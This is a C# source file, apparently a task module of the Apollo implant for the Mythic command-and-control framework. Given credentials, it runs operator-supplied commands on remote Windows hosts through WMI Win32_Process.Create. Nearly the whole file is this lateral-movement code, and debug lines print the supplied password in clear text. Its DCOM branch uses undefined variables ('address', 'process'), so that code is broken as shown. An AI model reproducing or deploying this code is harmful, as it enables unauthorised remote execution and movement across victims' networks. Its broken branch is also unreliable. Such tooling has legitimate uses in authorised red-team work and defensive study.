#define COMMAND_NAME_UPPER

#if DEBUG
#define WMIEXECUTE
#endif

#if WMIEXECUTE

using System;
using System.Management;
using System.Runtime.Serialization;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Utils;
using System.Runtime.InteropServices;


namespace Tasks;

public class wmiexecute : Tasking
{
    // Argument marshaling taking from:
    // https://learn.microsoft.com/en-us/dotnet/framework/interop/default-marshalling-for-objects
    [ComImport]
    [Guid("F309AD18-D86A-11d0-A075-00C04FB68820")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    public interface IWbemLevel1Login
    {
        [return: MarshalAs(UnmanagedType.Interface)]
        int EstablishPosition(/* ... */);
        int RequestChallenge(/* ... */);
        int WBEMLogin(/* ... */);
        int NTLMLogin([In, MarshalAs(UnmanagedType.LPWStr)] string wszNetworkResource, [In, MarshalAs(UnmanagedType.LPWStr)] string wszPreferredLocale, [In] long lFlags, [In, MarshalAs(UnmanagedType.IUnknown)] Object pCtx, [MarshalAs(UnmanagedType.IUnknown)] ref Object ppNamespace);
    }

    [ComImport]
    [Guid("9556dc99-828c-11cf-a37e-00aa003240c7")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    public interface IWbemServices
    {
        [return: MarshalAs(UnmanagedType.Interface)]
        int OpenNamespace(/* ... */);
        int CancelAsyncCall(/* ... */);
        int QueryObjectSink(/* ... */);
        int GetObject([MarshalAs(UnmanagedType.BStr)] string strObjectPath, [In] long lFlags, [In, Optional, MarshalAs(UnmanagedType.IUnknown)] Object pCtx, [In, Out, Optional, MarshalAs(UnmanagedType.IUnknown)] ref Object ppObject, [In, Out, Optional, MarshalAs(UnmanagedType.IUnknown)] ref Object ppCallResult);
        int GetObjectAsync(/* ... */);
        int PutClass(/* ... */);
        int PutClassAsync(/* ... */);
        int DeleteClass(/* ... */);
        int DeleteClassAsync(/* ... */);
        int CreateClassEnum(/* ... */);
        int CreateClassEnumAsync(/* ... */);
        int PutInstance(/* ... */);
        int PutInstanceAsync(/* ... */);
        int DeleteInstance(/* ... */);
        int DeleteInstanceAsync(/* ... */);
        int CreateInstanceEnum(/* ... */);
        int CreateInstanceEnumAsync(/* ... */);
        int ExecQuery(/* ... */);
        int ExecQueryAsync(/* ... */);
        int ExecNotificationQuery(/* ... */);
        int ExecNotificationQueryAsync(/* ... */);
        int ExecMethod([MarshalAs(UnmanagedType.BStr)] string strObjectPath, [MarshalAs(UnmanagedType.BStr)] string strMethodName, [In] long lFlags, [In, Optional, MarshalAs(UnmanagedType.IUnknown)] Object pCtx, [In, Optional, MarshalAs(UnmanagedType.IUnknown)] Object pInParams, [In, Out, Optional, MarshalAs(UnmanagedType.IUnknown)] ref Object ppOutParams, [In, Out, Optional, MarshalAs(UnmanagedType.IUnknown)] ref Object ppCallResult);
        int ExecMethodAsync(/* ... */);
    }

    [ComImport]
    [Guid("dc12a681-737f-11cf-884d-00aa004b2e24")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    public interface IWbemClassObject
    {
        [return: MarshalAs(UnmanagedType.Interface)]
        int GetQualifierSet(/* ... */);
        int Get([In, MarshalAs(UnmanagedType.LPWStr)] string wszName, [In] long lFlags, [In, Out] ref Object pVal, [In, Out, Optional] ref int pType, [In, Out, Optional] ref int plFlavor);
        int Put([In, MarshalAs(UnmanagedType.LPWStr)] string wszName, [In] long lFlags, [In] ref Object pVal, [In, Optional] int Type);
        int Delete(/* ... */);
        int GetNames(/* ... */);
        int BeginEnumeration(/* ... */);
        int Next(/* ... */);
        int EndEnumeration(/* ... */);
        int GetPropertyQualifierSet(/* ... */);
        int Clone(/* ... */);
        int GetObjectText(/* ... */);
        int SpawnDerivedClass(/* ... */);
        int SpawnInstance([In] long lFlags, [MarshalAs(UnmanagedType.IUnknown)] ref Object ppNewInstance);
        int CompareTo(/* ... */);
        int GetPropertyOrigin(/* ... */);
        int InheritsFrom(/* ... */);
        int GetMethod([In, MarshalAs(UnmanagedType.LPWStr)] string wszName, [In] long lFlags, [MarshalAs(UnmanagedType.IUnknown)] ref Object ppInSignature, [MarshalAs(UnmanagedType.IUnknown)] ref Object ppOutSignature);
        int PutMethod(/* ... */);
        int DeleteMethod(/* ... */);
        int BeginMethodEnumeration(/* ... */);
        int NextMethod(/* ... */);
        int EndMethodEnumeration(/* ... */);
        int GetMethodQualifierSet(/* ... */);
        int GetMethodOrigin(/* ... */);
    }
    [DataContract]
    internal struct WmiExecuteParameters
    {
        [DataMember(Name = "host")]
        internal string? HostName;
        [DataMember(Name = "username")] 
        internal string? Username;
        [DataMember(Name = "password")]
        internal string? Password;
        [DataMember(Name = "domain")]
        internal string? Domain;
        [DataMember(Name = "command")]
        internal string Command;
    }
    
    public wmiexecute(IAgent agent, MythicTask data) : base(agent, data)
    {
    }

    public override void Start()
    {
        MythicTaskResponse resp = CreateTaskResponse("", true);
        try
        {
            WmiExecuteParameters parameters = _jsonSerializer.Deserialize<WmiExecuteParameters>(_data.Parameters);
            string? HostName = parameters.HostName?.Trim();
            string? Username = parameters.Username?.Trim();
            string? Password = parameters.Password?.Trim();
            string? Domain = parameters.Domain?.Trim();
            string Command = parameters.Command.Trim();
            if(HostName != null && HostName != "" && (Password == null || Password == "")){
                // https://gist.github.com/EvanMcBroom/99ea88304faec38d3ed1deefd1aba6f9
                // Create an object on a remote host.
                // For the CLSID_WbemLevel1Login object, this requires you to use Administrative credentials.
                // CLSID_WbemLevel1Login does not allow you to immediately query IWbemLevel1Login so you
                // must query for IUnknown first.
                var CLSID_WbemLevel1Login = new Guid("8BC3F05E-D86B-11D0-A075-00C04FB68820");
                var typeInfo = Type.GetTypeFromCLSID(CLSID_WbemLevel1Login, address, true);
                var wbemLevel1Login = (IWbemLevel1Login)Activator.CreateInstance(typeInfo);
                object output = null;
                var result = wbemLevel1Login.NTLMLogin("ROOT\\CIMV2", null, 0, null, ref output);
                // Get the WMI object
                var wbemServices = (IWbemServices)output;
                result = wbemServices.GetObject("Win32_Process", 0, null, ref output, null);
                var win32Process = (IWbemClassObject)output;
                // Get the signature (e.g., the definition) of the input parameters.
                result = win32Process.GetMethod("Create", 0, ref output, null);
                var inSignature = (IWbemClassObject)output;
                // Create an instance of the input parameters for use to set them to
                // actual values.
                inSignature.SpawnInstance(0, ref output);
                var inParameters = (IWbemClassObject)output;
                var input = (object)process;
                result = inParameters.Put("CommandLine", 0, ref input);
                // Execute the Win32_Process:Create and show its output parameters.
                result = wbemServices.ExecMethod("Win32_Process", "Create", 0, null, inParameters, ref output, null);
                Object processID = null;
                Object returnValue = null;
                ((IWbemClassObject)output).Get("ProcessId", 0, ref processID);
                ((IWbemClassObject)output).Get("ReturnValue", 0, ref returnValue);
                if(returnValue.ToString() == "0"){
                    resp = CreateTaskResponse($"Command spawned PID ({processID.ToString()}) successfully", true, "success");
                }else{
                    resp = CreateTaskResponse($"Command spawned PID ({processID.ToString()}) and executed with error code ({returnValue.ToString()})", true, "error");
                }
                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
                return;
            }
            //Original version using wmi v1   
            ManagementScope scope = new ManagementScope();
            //executes for remote hosts
            if (string.IsNullOrEmpty(HostName) is false)
            {
                //set wmi connection options
                ConnectionOptions options = new ConnectionOptions
                {
                    EnablePrivileges = true,
                    Authentication = AuthenticationLevel.PacketPrivacy,
                    Impersonation = ImpersonationLevel.Impersonate,
                    Username = string.IsNullOrEmpty(Username)? null : Username,
                    Password = string.IsNullOrEmpty(Password)? null : Password,
                    Authority = string.IsNullOrEmpty(Domain)? null : $"NTLMDOMAIN:{Domain}"
                };
                DebugHelp.DebugWriteLine($@"trying to connect to target at: \\{HostName}\root\cimv2");
                DebugHelp.DebugWriteLine($@"Username: {options.Username}");
                DebugHelp.DebugWriteLine($@"Password: {Password}");
                DebugHelp.DebugWriteLine($@"Domain: {options.Authority}");
                scope = new ManagementScope($@"\\{HostName}\root\cimv2", options);
                scope.Connect();
                DebugHelp.DebugWriteLine("Connected to target machine");
            }
            //otherwise we assume the execution is local
            else
            {
                DebugHelp.DebugWriteLine($@"trying to execute locally");
            }

            //use system management object to execute command
            ObjectGetOptions objectGetOptions = new ObjectGetOptions();
            ManagementPath managementPath = new ManagementPath("Win32_Process");
            ManagementClass processClass = new ManagementClass(scope, managementPath, objectGetOptions);
            ManagementBaseObject inParams = processClass.GetMethodParameters("Create");
            DebugHelp.DebugWriteLine($"Executing command: {Command}");
            inParams["CommandLine"] = Command;
            
            
            // Invoke the "Create" method to create the process
            ManagementBaseObject outParams = processClass.InvokeMethod("Create", inParams, null);
            //get status code 
            uint returnCode = (uint) outParams["returnValue"];
            DebugHelp.DebugWriteLine($"Return code: {returnCode}");
            if (returnCode != 0)
            {
                resp = CreateTaskResponse($"Command failed with return code: {returnCode}", true, "error");
            }
            else
            {
                resp = CreateTaskResponse("Command executed successfully", true);
            }
            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
        catch (Exception e)
        {
            if(e.Message.Contains("80070005"))
            {
                string extraMsg = "Unable to leverage impersonated tokens (make_token / steal_token) with WMI due to existing CoInitializeSecurity settings.\n";
                resp = CreateTaskResponse(extraMsg + "\n" + e.Message + "\n" + e.StackTrace, true, "error");
            } else
            {
                resp = CreateTaskResponse(e.Message + "\n" + e.StackTrace, true, "error");
            }
            DebugHelp.DebugWriteLine(e.Message);
            DebugHelp.DebugWriteLine(e.StackTrace);
            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
       
    }
}
#endif

// wmi interaction using the new Microsoft.Management.Infrastructure library but requires .net 4.5.1 as the target and did not produce and meaningful differences like capturing output so for now is not used
 /*DComSessionOptions DComOptions = new DComSessionOptions
            {
                Impersonation = ImpersonationType.Impersonate,
                PacketIntegrity = true,
                PacketPrivacy = true,
                Timeout = TimeSpan.FromSeconds(120)
            };
            
            CimCredential credentials = new CimCredential(ImpersonatedAuthenticationMechanism.NtlmDomain);
            if (string.IsNullOrWhiteSpace(Username) is false)
            {
                SecureString securePassword = new SecureString();
                foreach (char c in Password)
                {
                    securePassword.AppendChar(c);
                }
                credentials = new CimCredential(PasswordAuthenticationMechanism.Default, Domain, Username, securePassword);
                DebugHelp.DebugWriteLine("using credentials");
                DComOptions.AddDestinationCredentials(credentials);
            }
            
            CimSession mySession = null;
            if (string.IsNullOrWhiteSpace(HostName) is false)
            {
                mySession = CimSession.Create(HostName,DComOptions);
            }
            else
            {
                mySession = CimSession.Create("localhost", DComOptions);
            }
            // Create an instance of the Win32_ProcessStartup class
            CimInstance startupInfo = new CimInstance("Win32_ProcessStartup", "root/cimv2");
            startupInfo.CimInstanceProperties.Add(CimProperty.Create("CreateFlags", 16, CimFlags.None)); // STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES

            // Create an anonymous pipe for output redirection
            AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable);
            string pipeHandle = pipeServer.GetClientHandleAsString();

            // Set the StandardOutput property to redirect output to the anonymous pipe
            startupInfo.CimInstanceProperties.Add(CimProperty.Create("StandardOutput", pipeHandle, CimFlags.None));

            // Create a CimMethodParametersCollection to hold the method parameters
            CimMethodParametersCollection methodParameters = new CimMethodParametersCollection();
            methodParameters.Add(CimMethodParameter.Create("CommandLine", Command, CimFlags.In));
            methodParameters.Add(CimMethodParameter.Create("ProcessStartupInformation", startupInfo, CimFlags.Property));

            CimInstance process = new CimInstance("Win32_Process", "root/cimv2");
            
            // Invoke the "Create" method to create the process with the modified startup options
            CimMethodResult result = mySession.InvokeMethod(process, "Create", methodParameters);

            // Read the output from the anonymous pipe
            using (StreamReader reader = new StreamReader(pipeServer))
            {
                string output = reader.ReadToEnd();
                DebugHelp.DebugWriteLine($"Command output: {output}");
                resp = CreateTaskResponse(output, true);
                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
            }*/